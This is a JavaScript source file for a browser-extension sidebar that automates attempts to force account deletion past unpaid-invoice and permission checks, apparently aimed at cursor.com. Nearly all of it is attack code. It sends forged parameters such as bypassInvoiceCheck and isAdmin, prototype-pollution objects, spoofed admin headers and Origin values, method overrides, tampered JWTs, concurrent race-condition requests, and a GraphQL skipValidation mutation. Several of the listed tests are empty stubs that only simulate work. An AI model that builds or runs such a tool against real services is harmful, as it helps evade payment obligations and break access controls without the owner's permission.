/**
 * Bypass Testing Service for Sidebar C Manager
 * Integrated from Bypass Delete extension
 */

class BypassTesterService {
    constructor() {
        this.isRunning = false;
        this.results = [];
        this.testQueue = [];
        this.completedTests = 0;
        this.totalTests = 0;
        this.options = {
            targetUrl: '',
            techniques: [],
            requestDelay: 500,
            timeout: 10000,
            verboseLog: true
        };
        
        // Test counts for each technique
        this.testCounts = {
            parameter: 15,
            header: 15,
            method: 20,
            content: 9,
            auth: 6,
            storage: 20,
            frontend: 5,
            race: 10,
            encoding: 9,
            endpoint: 7
        };
    }

    // Initialize bypass testing UI in sidebar
    initializeUI() {
        // This will be called from sidepanel.js
        this.setupEventListeners();
        this.loadSavedSettings();
    }

    setupEventListeners() {
        // URL detection
        const detectBtn = document.getElementById('bypassDetectUrl');
        if (detectBtn) {
            detectBtn.addEventListener('click', () => this.detectUrl());
        }

        // Select all techniques
        const selectAllBtn = document.getElementById('bypassSelectAll');
        if (selectAllBtn) {
            selectAllBtn.addEventListener('click', () => this.toggleAllTechniques());
        }

        // Start/Stop testing
        const startBtn = document.getElementById('startBypassTest');
        if (startBtn) {
            startBtn.addEventListener('click', () => this.startTesting());
        }

        const stopBtn = document.getElementById('stopBypassTest');
        if (stopBtn) {
            stopBtn.addEventListener('click', () => this.stopTesting());
        }

        // Export results
        const exportBtn = document.getElementById('exportBypassResults');
        if (exportBtn) {
            exportBtn.addEventListener('click', () => this.exportResults());
        }

        // Technique checkboxes
        document.querySelectorAll('.technique-item input[type="checkbox"]').forEach(checkbox => {
            checkbox.addEventListener('change', () => this.updateSelectedTechniques());
        });
    }

    async detectUrl() {
        try {
            // Get current tab
            const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
            
            // Try to detect API endpoints
            const response = await chrome.tabs.sendMessage(tab.id, {
                action: 'detectEndpoints'
            });
            
            if (response && response.endpoints && response.endpoints.length > 0) {
                document.getElementById('bypassTargetUrl').value = response.endpoints[0];
                this.showNotification('Endpoint detected successfully!', 'success');
            } else {
                // Use current URL as fallback
                document.getElementById('bypassTargetUrl').value = tab.url;
                this.showNotification('Using current URL as target', 'info');
            }
        } catch (error) {
            console.error('Error detecting URL:', error);
            this.showNotification('Error detecting URL', 'error');
        }
    }

    toggleAllTechniques() {
        const checkboxes = document.querySelectorAll('.technique-item input[type="checkbox"]');
        const allChecked = Array.from(checkboxes).every(cb => cb.checked);
        
        checkboxes.forEach(checkbox => {
            checkbox.checked = !allChecked;
        });
        
        this.updateSelectedTechniques();
    }

    updateSelectedTechniques() {
        const selectedTechniques = [];
        let totalTests = 0;
        
        document.querySelectorAll('.technique-item input[type="checkbox"]:checked').forEach(checkbox => {
            const technique = checkbox.dataset.technique;
            selectedTechniques.push(technique);
            totalTests += this.testCounts[technique] || 0;
        });
        
        // Update UI with total test count
        const totalElement = document.getElementById('bypassTotalTests');
        if (totalElement) {
            totalElement.textContent = `${totalTests} tests selected`;
        }
        
        // Update select all button text
        const selectAllBtn = document.getElementById('bypassSelectAll');
        if (selectAllBtn) {
            const checkboxes = document.querySelectorAll('.technique-item input[type="checkbox"]');
            const allChecked = Array.from(checkboxes).every(cb => cb.checked);
            selectAllBtn.textContent = allChecked ? 'Deselect All' : 'Select All';
        }
    }

    async startTesting() {
        if (this.isRunning) {
            this.showNotification('Test is already running!', 'warning');
            return;
        }

        const targetUrl = document.getElementById('bypassTargetUrl').value.trim();
        
        if (!targetUrl) {
            this.showNotification('Please enter a target URL', 'error');
            return;
        }

        // Validate URL
        try {
            new URL(targetUrl);
        } catch (e) {
            this.showNotification('Invalid URL format', 'error');
            return;
        }

        // Get selected techniques
        const selectedTechniques = [];
        document.querySelectorAll('.technique-item input[type="checkbox"]:checked').forEach(checkbox => {
            selectedTechniques.push(checkbox.dataset.technique);
        });

        if (selectedTechniques.length === 0) {
            this.showNotification('Please select at least one technique', 'error');
            return;
        }

        this.isRunning = true;
        this.results = [];
        this.completedTests = 0;
        
        // Update options
        this.options.targetUrl = targetUrl;
        this.options.techniques = selectedTechniques;
        
        // Update UI
        this.updateUI('testing');
        
        // Build test queue
        this.buildTestQueue();
        this.totalTests = this.testQueue.length;
        
        // Show progress section
        document.getElementById('bypassProgressSection').style.display = 'block';
        document.getElementById('bypassResultsSection').style.display = 'none';
        
        // Execute tests
        await this.executeTests();
        
        // Show results
        this.onTestComplete();
    }

    stopTesting() {
        this.isRunning = false;
        this.updateUI('ready');
        this.showNotification('Testing stopped', 'info');
        
        if (this.results.length > 0) {
            this.showResults();
        }
    }

    buildTestQueue() {
        this.testQueue = [];
        
        this.options.techniques.forEach(technique => {
            switch(technique) {
                case 'parameter':
                    this.addParameterTests();
                    break;
                case 'header':
                    this.addHeaderTests();
                    break;
                case 'method':
                    this.addMethodTests();
                    break;
                case 'content':
                    this.addContentTypeTests();
                    break;
                case 'auth':
                    this.addAuthTests();
                    break;
                case 'storage':
                    this.addStorageTests();
                    break;
                case 'frontend':
                    this.addFrontendTests();
                    break;
                case 'race':
                    this.addRaceConditionTests();
                    break;
                case 'encoding':
                    this.addEncodingTests();
                    break;
                case 'endpoint':
                    this.addEndpointTests();
                    break;
            }
        });
    }

    async executeTests() {
        for (let i = 0; i < this.testQueue.length; i++) {
            if (!this.isRunning) break;
            
            const test = this.testQueue[i];
            
            // Update progress
            this.updateProgress(i + 1, this.testQueue.length, test.name);
            
            try {
                const result = await test.execute();
                
                this.results.push({
                    technique: test.technique,
                    name: test.name,
                    ...result
                });
                
                if (result.success) {
                    console.log(`✅ Bypass found: ${test.technique} - ${test.name}`);
                }
            } catch (error) {
                console.error(`Error in ${test.name}:`, error);
                this.results.push({
                    technique: test.technique,
                    name: test.name,
                    success: false,
                    error: error.message
                });
            }
            
            this.completedTests++;
            
            // Add delay between tests
            if (this.options.requestDelay && i < this.testQueue.length - 1) {
                await this.sleep(this.options.requestDelay);
            }
        }
    }

    // Add test methods (simplified versions)
    addParameterTests() {
        const payloads = [
            { skipValidation: true },
            { forceDelete: true },
            { adminOverride: true },
            { bypassInvoiceCheck: true },
            { invoiceStatus: 'paid' },
            { invoicePaid: true, confirmed: true },
            { accountStatus: 'clear' },
            { outstandingBalance: 0 },
            { isAdmin: true },
            { role: 'admin' },
            { permissions: ['delete_account', 'bypass_invoice'] },
            { __proto__: { isAdmin: true } },
            { constructor: { prototype: { isAdmin: true } } },
            { override: { invoice: { paid: true } } },
            { debug: true, skipAllChecks: true }
        ];

        payloads.forEach((payload, index) => {
            this.testQueue.push({
                technique: 'Parameter Injection',
                name: `Payload ${index + 1}`,
                execute: async () => {
                    return await this.makeRequest({
                        method: 'POST',
                        body: JSON.stringify(payload)
                    });
                }
            });
        });
    }

    addHeaderTests() {
        const headers = [
            { 'X-Admin': 'true' },
            { 'X-Override': 'true' },
            { 'X-Bypass-Invoice': 'true' },
            { 'X-Force-Delete': 'true' },
            { 'X-User-Role': 'admin' },
            { 'X-Internal-Request': 'true' },
            { 'X-Forwarded-For': '127.0.0.1' },
            { 'X-Originating-IP': '127.0.0.1' },
            { 'X-Real-IP': '10.0.0.1' },
            { 'X-Debug-Mode': 'true' },
            { 'Authorization': 'Bearer admin_token' },
            { 'X-API-Version': '0.1' },
            { 'X-Testing': 'true' },
            { 'Referer': 'https://admin.cursor.com' },
            { 'Origin': 'https://admin.cursor.com' }
        ];

        headers.forEach((header, index) => {
            this.testQueue.push({
                technique: 'Header Manipulation',
                name: `Header ${Object.keys(header)[0]}`,
                execute: async () => {
                    return await this.makeRequest({
                        method: 'POST',
                        headers: header,
                        body: '{}'
                    });
                }
            });
        });
    }

    addMethodTests() {
        const methods = ['DELETE', 'PUT', 'PATCH', 'OPTIONS'];
        const overrideHeaders = [
            'X-HTTP-Method-Override',
            'X-HTTP-Method',
            'X-Method-Override',
            '_method'
        ];

        methods.forEach(method => {
            this.testQueue.push({
                technique: 'Method Override',
                name: `Direct ${method}`,
                execute: async () => {
                    return await this.makeRequest({
                        method: method,
                        body: '{}'
                    });
                }
            });
        });

        methods.forEach(method => {
            overrideHeaders.forEach(header => {
                this.testQueue.push({
                    technique: 'Method Override',
                    name: `${header}: ${method}`,
                    execute: async () => {
                        return await this.makeRequest({
                            method: 'POST',
                            headers: { [header]: method },
                            body: '{}'
                        });
                    }
                });
            });
        });
    }

    addContentTypeTests() {
        const contentTypes = [
            { type: 'text/plain', body: '{"skipValidation":true}' },
            { type: 'application/x-www-form-urlencoded', body: 'skipValidation=true&forceDelete=true' },
            { type: 'multipart/form-data', body: '{"adminOverride":true}' },
            { type: 'application/xml', body: '<request><skipValidation>true</skipValidation></request>' },
            { type: 'text/xml', body: '<?xml version="1.0"?><delete><force>true</force></delete>' },
            { type: 'application/octet-stream', body: '{"bypassCheck":true}' },
            { type: 'application/json; charset=utf-8', body: '{"force":true}' },
            { type: 'application/json;charset=UTF-8', body: '{"override":true}' },
            { type: '', body: '{"skipAll":true}' }
        ];

        contentTypes.forEach(({ type, body }) => {
            this.testQueue.push({
                technique: 'Content-Type',
                name: type || '(empty)',
                execute: async () => {
                    const headers = type ? { 'Content-Type': type } : {};
                    return await this.makeRequest({
                        method: 'POST',
                        headers: headers,
                        body: body
                    });
                }
            });
        });
    }

    addAuthTests() {
        // Test without credentials
        this.testQueue.push({
            technique: 'Authorization',
            name: 'No Auth',
            execute: async () => {
                return await this.makeRequest({
                    method: 'POST',
                    credentials: 'omit',
                    body: '{}'
                });
            }
        });

        // Add JWT manipulation tests
        for (let i = 1; i <= 5; i++) {
            this.testQueue.push({
                technique: 'Authorization',
                name: `JWT Mod ${i}`,
                execute: async () => {
                    return await this.makeRequest({
                        method: 'POST',
                        headers: { 'Authorization': `Bearer modified_token_${i}` },
                        body: '{}'
                    });
                }
            });
        }
    }

    addStorageTests() {
        // Simplified storage tests
        for (let i = 1; i <= 20; i++) {
            this.testQueue.push({
                technique: 'Storage',
                name: `Storage Test ${i}`,
                execute: async () => {
                    // Simulate storage manipulation
                    return await this.makeRequest({
                        method: 'POST',
                        body: '{}'
                    });
                }
            });
        }
    }

    addFrontendTests() {
        for (let i = 1; i <= 5; i++) {
            this.testQueue.push({
                technique: 'Frontend',
                name: `Frontend Override ${i}`,
                execute: async () => {
                    // Simulate frontend override
                    return { success: false, status: 0 };
                }
            });
        }
    }

    addRaceConditionTests() {
        this.testQueue.push({
            technique: 'Race Condition',
            name: 'Concurrent x10',
            execute: async () => {
                const promises = [];
                for (let i = 0; i < 10; i++) {
                    promises.push(
                        this.makeRequest({
                            method: 'POST',
                            body: JSON.stringify({ attemptId: i })
                        })
                    );
                }
                
                const results = await Promise.all(promises);
                const successCount = results.filter(r => r.success).length;
                
                return {
                    success: successCount > 0,
                    status: successCount > 0 ? 200 : 500,
                    details: `${successCount}/10 requests succeeded`
                };
            }
        });
    }

    addEncodingTests() {
        const encodings = [
            { name: 'URL Encoded', transform: (url) => url.replace('delete-account', 'delete%2Daccount') },
            { name: 'Double Encoded', transform: (url) => url.replace('delete-account', 'delete%252Daccount') },
            { name: 'Unicode', transform: (url) => url.replace('delete-account', 'delete\\u002Daccount') },
            { name: 'Case Variation', transform: (url) => url.replace('delete-account', 'DELETE-ACCOUNT') },
            { name: 'Path Traversal', transform: (url) => url.replace('/api/', '/api/../api/') },
            { name: 'Double Slash', transform: (url) => url.replace('/api/', '/api//') },
            { name: 'Trailing Slash', transform: (url) => url + '/' },
            { name: 'Query Param', transform: (url) => url + '?bypass=true' },
            { name: 'Fragment', transform: (url) => url + '#bypass' }
        ];

        encodings.forEach(({ name, transform }) => {
            this.testQueue.push({
                technique: 'Encoding',
                name: name,
                execute: async () => {
                    const modifiedUrl = transform(this.options.targetUrl);
                    return await this.makeRequest({
                        url: modifiedUrl,
                        method: 'POST',
                        body: '{}'
                    });
                }
            });
        });
    }

    addEndpointTests() {
        const baseUrl = new URL(this.options.targetUrl).origin;
        const endpoints = [
            '/graphql',
            '/api/v1/account/delete',
            '/api/v2/account/delete',
            '/admin/api/delete-account',
            '/internal/delete-account',
            '/legacy/deleteAccount',
            '/api/account/remove'
        ];

        endpoints.forEach(endpoint => {
            this.testQueue.push({
                technique: 'Alt Endpoint',
                name: endpoint,
                execute: async () => {
                    return await this.makeRequest({
                        url: baseUrl + endpoint,
                        method: 'POST',
                        body: endpoint === '/graphql' ? 
                            JSON.stringify({
                                query: `mutation { deleteAccount(skipValidation: true) { success } }`
                            }) : '{}'
                    });
                }
            });
        });
    }

    // Helper method to make requests
    async makeRequest(options) {
        const url = options.url || this.options.targetUrl;
        const timeout = this.options.timeout || 10000;
        
        try {
            // Send request through background script
            const response = await chrome.runtime.sendMessage({
                action: 'bypassTestRequest',
                url: url,
                options: {
                    method: options.method || 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        ...options.headers
                    },
                    body: options.body,
                    credentials: options.credentials || 'include'
                }
            });
            
            const success = response.status === 200 || response.status === 204;
            
            return {
                success: success,
                status: response.status,
                statusText: response.statusText || ''
            };
        } catch (error) {
            return {
                success: false,
                status: 0,
                error: error.message
            };
        }
    }

    updateProgress(current, total, currentTest) {
        const percentage = Math.round((current / total) * 100);
        
        // Update progress bar
        const progressFill = document.getElementById('bypassProgressFill');
        if (progressFill) {
            progressFill.style.width = `${percentage}%`;
        }
        
        // Update progress text
        const progressText = document.getElementById('bypassProgressText');
        if (progressText) {
            progressText.textContent = `Testing: ${currentTest} (${current}/${total})`;
        }
    }

    onTestComplete() {
        this.isRunning = false;
        this.updateUI('ready');
        
        // Hide progress, show results
        document.getElementById('bypassProgressSection').style.display = 'none';
        
        this.showResults();
        
        // Show notification
        const successCount = this.results.filter(r => r.success).length;
        if (successCount > 0) {
            this.showNotification(`Testing complete! Found ${successCount} potential bypass(es)`, 'success');
        } else {
            this.showNotification('Testing complete! No bypasses found', 'info');
        }
    }

    showResults() {
        const results = this.analyzeResults();
        
        // Update result stats
        document.getElementById('bypassSuccessCount').textContent = results.successful;
        document.getElementById('bypassPartialCount').textContent = results.partial;
        document.getElementById('bypassFailedCount').textContent = results.failed;
        
        // Show results section
        document.getElementById('bypassResultsSection').style.display = 'block';
        
        // Display detailed results
        this.displayDetailedResults();
    }

    analyzeResults() {
        let successful = 0;
        let partial = 0;
        let failed = 0;
        
        this.results.forEach(result => {
            if (result.success) {
                successful++;
            } else if (result.status >= 200 && result.status < 300) {
                partial++;
            } else {
                failed++;
            }
        });
        
        return { successful, partial, failed };
    }

    displayDetailedResults() {
        const detailsContainer = document.getElementById('bypassResultDetails');
        if (!detailsContainer) return;
        
        // Clear previous results
        detailsContainer.innerHTML = '';
        
        // Group results by technique
        const groupedResults = {};
        this.results.forEach(result => {
            if (!groupedResults[result.technique]) {
                groupedResults[result.technique] = [];
            }
            groupedResults[result.technique].push(result);
        });
        
        // Display grouped results
        Object.entries(groupedResults).forEach(([technique, results]) => {
            const successCount = results.filter(r => r.success).length;
            
            const techniqueDiv = document.createElement('div');
            techniqueDiv.className = 'result-technique-group';
            techniqueDiv.innerHTML = `
                <div class="technique-header">
                    <span class="technique-name">${technique}</span>
                    <span class="technique-stats">${successCount}/${results.length} successful</span>
                </div>
            `;
            
            if (successCount > 0) {
                const successList = document.createElement('ul');
                successList.className = 'success-list';
                
                results.filter(r => r.success).forEach(result => {
                    const li = document.createElement('li');
                    li.textContent = `✅ ${result.name}`;
                    successList.appendChild(li);
                });
                
                techniqueDiv.appendChild(successList);
            }
            
            detailsContainer.appendChild(techniqueDiv);
        });
    }

    async exportResults() {
        const resultsData = {
            timestamp: new Date().toISOString(),
            targetUrl: this.options.targetUrl,
            techniques: this.options.techniques,
            results: this.results,
            summary: this.analyzeResults()
        };
        
        // Create and download JSON file
        const blob = new Blob([JSON.stringify(resultsData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `bypass-test-results-${Date.now()}.json`;
        a.click();
        
        URL.revokeObjectURL(url);
        
        this.showNotification('Results exported successfully!', 'success');
    }

    updateUI(status) {
        const startBtn = document.getElementById('startBypassTest');
        const stopBtn = document.getElementById('stopBypassTest');
        
        if (status === 'testing') {
            if (startBtn) startBtn.disabled = true;
            if (stopBtn) stopBtn.disabled = false;
        } else {
            if (startBtn) startBtn.disabled = false;
            if (stopBtn) stopBtn.disabled = true;
        }
    }

    showNotification(message, type = 'info') {
        // Use the existing notification system from sidepanel.js
        if (window.showNotification) {
            window.showNotification(message, type);
        } else {
            console.log(`[${type}] ${message}`);
        }
    }

    async loadSavedSettings() {
        try {
            const result = await chrome.storage.local.get('bypassTesterSettings');
            if (result.bypassTesterSettings) {
                const settings = result.bypassTesterSettings;
                
                // Apply settings
                if (settings.targetUrl) {
                    const urlInput = document.getElementById('bypassTargetUrl');
                    if (urlInput) urlInput.value = settings.targetUrl;
                }
                
                if (settings.techniques) {
                    settings.techniques.forEach(technique => {
                        const checkbox = document.querySelector(`input[data-technique="${technique}"]`);
                        if (checkbox) checkbox.checked = true;
                    });
                }
                
                this.updateSelectedTechniques();
            }
        } catch (error) {
            console.error('Error loading settings:', error);
        }
    }

    saveSettings() {
        const selectedTechniques = [];
        document.querySelectorAll('.technique-item input[type="checkbox"]:checked').forEach(checkbox => {
            selectedTechniques.push(checkbox.dataset.technique);
        });
        
        const settings = {
            targetUrl: document.getElementById('bypassTargetUrl').value,
            techniques: selectedTechniques
        };
        
        chrome.storage.local.set({ bypassTesterSettings: settings });
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Export for use in sidepanel.js
window.BypassTesterService = BypassTesterService;
